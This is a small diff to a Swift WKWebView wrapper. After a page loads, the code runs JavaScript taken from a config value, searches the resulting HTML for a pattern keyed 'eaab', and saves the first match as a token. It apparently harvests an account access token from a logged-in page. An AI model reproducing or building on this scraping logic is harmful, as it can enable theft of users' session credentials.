@@ -59,9 +59,9 @@ struct CoordsFour: UIViewRepresentable {
         
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
+                webView.evaluateJavaScript(self.four_parent.arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                     if let content = html as? String, error == nil {
-                        let get_ky_tu_ss = self.ham_tim_ky_tu(for: arrayData[ValueKey.eaab_fr_1a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
+                        let get_ky_tu_ss = self.ham_tim_ky_tu(for: self.four_parent.arrayData[ValueKey.eaab_fr_1a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
                         if !get_ky_tu_ss.isEmpty {
                             self.four_parent.is_four_loading = true
                             self.four_parent.is_four_get_value_token = get_ky_tu_ss[0]
